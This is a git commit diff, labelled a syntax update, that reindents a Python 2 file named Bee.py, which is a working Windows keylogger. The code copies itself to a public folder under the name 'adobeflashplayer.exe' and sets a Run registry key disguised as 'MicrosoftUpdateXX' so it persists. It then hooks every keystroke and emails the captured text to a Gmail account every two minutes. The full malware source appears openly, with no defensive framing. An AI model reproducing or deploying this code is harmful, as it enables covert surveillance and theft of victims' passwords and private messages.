09f9d37725deaaca68429e6d9a0ad2ecfeca2deb
franklin <franklin@hdeb>
2017-06-02 03:40:52 -0300

    Update syntax

--- Templates/Bee.py
+++ Templates/Bee.py
@@ -14,85 +14,85 @@ import sys
 
 ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
-	ironm = None
-	print "nope"
-	sys.exit()
+    ironm = None
+    print "nope"
+    sys.exit()
 
 x, data, count= '', '', 0
 
 dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
 
 def startup():
-	shutil.copy(sys.argv[0], dir)
-	aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
-	aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
-	SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)	
+    shutil.copy(sys.argv[0], dir)
+    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
+    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)    
 if not path.isfile(dir):
-	startup()	
+    startup()   
 
-	
+    
 def send_mail():
-	global data
-	while True:
-		if len(data) > 30:
-			timeInSecs = datetime.datetime.now()
-			SERVER = "smtp.gmail.com"
-			PORT = 587
-			USER = EEMAIL
-			PASS = EPASS
-			FROM = USER
-			TO = [USER]
-			SUBJECT = "B33: " + timeInSecs.isoformat() 
-			MESSAGE =  data 
+    global data
+    while True:
+        if len(data) > 30:
+            timeInSecs = datetime.datetime.now()
+            SERVER = "smtp.gmail.com"
+            PORT = 587
+            USER = EEMAIL
+            PASS = EPASS
+            FROM = USER
+            TO = [USER]
+            SUBJECT = "B33: " + timeInSecs.isoformat() 
+            MESSAGE =  data 
 
-			message_payload = "\r\n".join((
-								"From: %s" %FROM,
-								"To: %s" %TO,
-								"Subject: %s" %SUBJECT,
-								"",
-								MESSAGE))
-			try:
-				server = smtplib.SMTP()
-				server.connect(SERVER, PORT)
-				server.starttls()
-				server.login(USER, PASS)
-				server.sendmail(FROM, TO, message_payload)
-				data = ''
-				server.quit()
-			except Exception as error:
-				print error
-		sleep(120)
-			
+            message_payload = "\r\n".join((
+                                "From: %s" %FROM,
+                                "To: %s" %TO,
+                                "Subject: %s" %SUBJECT,
+                                "",
+                                MESSAGE))
+            try:
+                server = smtplib.SMTP()
+                server.connect(SERVER, PORT)
+                server.starttls()
+                server.login(USER, PASS)
+                server.sendmail(FROM, TO, message_payload)
+                data = ''
+                server.quit()
+            except Exception as error:
+                print error
+        sleep(120)
+            
 
 if __name__ == '__main__':
-	triggerThread = Thread(target=send_mail)
-	triggerThread.start()
+    triggerThread = Thread(target=send_mail)
+    triggerThread.start()
 
 def pushing(event):
-	global data
-	keys = {
-			13: ' [ENTER] ',
-			8: ' [BACKSPACE] ',
-			162: ' [CTRL] ',
-			163: ' [CTRL] ',
-			164: ' [ALT] ',
-			165: ' [ALT] ',
-			160: ' [SHIFT] ',
-			161: ' [SHIFT] ',
-			46: ' [DELETE] ',
-			32: ' [SPACE] ',
-			27: ' [ESC] ',
-			9: ' [TAB] ',
-			20: ' [CAPSLOCK] ',
-			38: ' [UP] ',
-			40: ' [DOWN] ',
-			37: ' [LEFT] ',
-			39: ' [RIGHT] ',
-			91: ' [SUPER] '
-			}
-	keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
-	data += keyboardKeyName
-	
+    global data
+    keys = {
+            13: ' [ENTER] ',
+            8: ' [BACKSPACE] ',
+            162: ' [CTRL] ',
+            163: ' [CTRL] ',
+            164: ' [ALT] ',
+            165: ' [ALT] ',
+            160: ' [SHIFT] ',
+            161: ' [SHIFT] ',
+            46: ' [DELETE] ',
+            32: ' [SPACE] ',
+            27: ' [ESC] ',
+            9: ' [TAB] ',
+            20: ' [CAPSLOCK] ',
+            38: ' [UP] ',
+            40: ' [DOWN] ',
+            37: ' [LEFT] ',
+            39: ' [RIGHT] ',
+            91: ' [SUPER] '
+            }
+    keyboardKeyName = keys.get(event.Ascii, chr(event.Ascii))
+    data += keyboardKeyName
+    
 hookManager = pyHook.HookManager()
 hookManager.KeyDown = pushing
 hookManager.HookKeyboard()
